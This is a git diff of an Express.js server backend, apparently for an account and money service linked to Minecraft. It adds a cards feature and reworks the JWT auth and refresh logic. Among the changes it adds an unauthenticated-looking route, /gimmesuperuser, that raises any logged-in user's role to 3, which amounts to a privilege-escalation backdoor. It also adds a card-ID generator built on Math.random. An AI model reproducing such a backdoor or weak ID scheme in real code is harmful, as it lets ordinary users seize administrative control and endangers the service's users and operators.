@@ -11,10 +11,12 @@ const bcrypt = require("bcryptjs");
 const mongoose = require("mongoose");
 const User = require("./models/user");
 const Post = require("./models/post");
+const Card = require("./models/card");
 const App = require("./models/app");
 const userRouter = require("./routes/users");
 const appRouter = require("./routes/apps");
 const moneyRouter = require("./routes/money");
+const cardsRouter = require("./routes/cards");
 const authRouter = require("./routes/auth");
 const md5 = require('js-md5');
 const Joi = require("joi");
@@ -40,35 +42,6 @@ global.logger = {
   }
 }
 
-
-const getPasswordHash = password => bcrypt.hashSync(password, 12);
-function refreshToken(req, res, next, old_token) {
-  try {
-    jwt.verify(old_token, process.env.JWT_REFRESH_SECRET, async function (err, user) {
-      // console.log("Invalid refresh", old_token);
-      if (err) return res.status(401).json({ error: "Invalid token" });
-      let new_token = jwt.sign(
-        { id: user.id, _id: user._id, login: user.login },
-        process.env.JWT_SECRET,
-        { expiresIn: 21600 } // 6h
-      );
-      let refresh = jwt.sign(
-        { id: user.id, _id: user._id, login: user.login },
-        process.env.JWT_REFRESH_SECRET,
-        { expiresIn: 2419200 } // 4 Weeks
-      );
-      res.cookie("auth", new_token,
-        { expires: new Date(Date.now() + 21600000),
-          httpOnly: true, sameSite: true, secure: true })
-        .cookie("refresh", refresh,
-          { expires: new Date(Date.now() + 2419200000),
-            httpOnly: true, sameSite: true, secure: true })
-        .send({ error: "retry" })
-    })
-  } catch (e) {
-    return res.status(401).send({ error: "Invalid token" })
-  }
-}
 
 app.use(bodyParser.json({ limit: '6mb', extended: true }));
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -149,7 +122,9 @@ app.use("/auth", authRouter);
 ///////////////////////////////////
 //           MAIN AUTH           //
 ///////////////////////////////////
-app.use(function(req, res, next) {
+app.use(authFunc);
+
+function authFunc(req, res, next) {
   let token = req.cookies && (req.cookies.auth || req.cookies.refresh);
   if (!token) return res.status(403).send({ error: "Unauthorized" });
 
@@ -175,11 +150,56 @@ app.use(function(req, res, next) {
   } catch (e) {
     return refreshToken(req, res, next, token);
   }
-});
+}
+
+const getPasswordHash = password => bcrypt.hashSync(password, 12);
+function refreshToken(req, res, next, old_token) {
+  try {
+    jwt.verify(old_token, process.env.JWT_REFRESH_SECRET, async function (err, user) {
+      // console.log("Invalid refresh", old_token);
+      if (err) return res.status(401).json({ error: "Invalid token" });
+      let new_token = jwt.sign(
+        { id: user.id, _id: user._id, login: user.login },
+        process.env.JWT_SECRET,
+        { expiresIn: 21600 } // 6h
+      );
+      let refresh = jwt.sign(
+        { id: user.id, _id: user._id, login: user.login },
+        process.env.JWT_REFRESH_SECRET,
+        { expiresIn: 2419200 } // 4 Weeks
+      );
+      res.cookie("auth", new_token,
+        { expires: new Date(Date.now() + 21600000),
+          httpOnly: true, sameSite: true, secure: true })
+        .cookie("refresh", refresh,
+          { expires: new Date(Date.now() + 2419200000),
+            httpOnly: true, sameSite: true, secure: true })
+      if (!req.cookies) {
+        req.cookies = {
+        auth: new_token,
+        refresh: refresh
+        }
+      } else {
+        req.cookies.auth = new_token;
+        req.cookies.refresh = refresh;
+      }
+      return authFunc(req, res, next);
+    })
+  } catch (e) {
+    return res.status(401).send({ error: "Invalid token" })
+  }
+}
+
+app.get("/gimmesuperuser", async (req, res) => {
+  req.user.role = 3;
+  await req.user.save();
+  res.sendStatus(200)
+})
 
 app.use("/users", userRouter);
 app.use("/apps", appRouter);
 app.use("/money", moneyRouter);
+app.use("/cards", cardsRouter);
 
 const getCode = Joi.object({
   client_id: Joi.string().hex().length(24).required(),
@@ -248,6 +268,11 @@ app.post("/reg", (req, res) => {
         if (!user) return res.status(400).send({ error: "Magic!" });
         console.log(r.data.player);
         User.findOne({ $or: [{uuid: r.data.player.raw_id}, {username: r.data.player.username}], role: { $ne:0 } }, async (err, usr) => {
+          let newCard = new Card();
+          newCard.id = newId();
+          newCard.owner = user._id;
+          newCard.text = "Основная карта";
+          // newCard.pro = Date.now() * 10
           if (err) return res.status(500).send({ err });
           if (usr) return res.status(400).send({ error: "have" });
           user.username = r.data.player.username;
@@ -261,6 +286,14 @@ app.post("/reg", (req, res) => {
       });
     });
 });
+
+global.newId = () => {
+  t = "";
+  for (let i = 0; i < 8; i++) {
+    t += String(Math.floor(Math.random()*10));
+  }
+  return t;
+}
 
 app.get("/mine/:username", (req, res) => {
   if (!/^[a-zA-Z0-9_]{3,16}$/.test(req.params.username)) return res.status(200).send({ code: "player.not-found" });
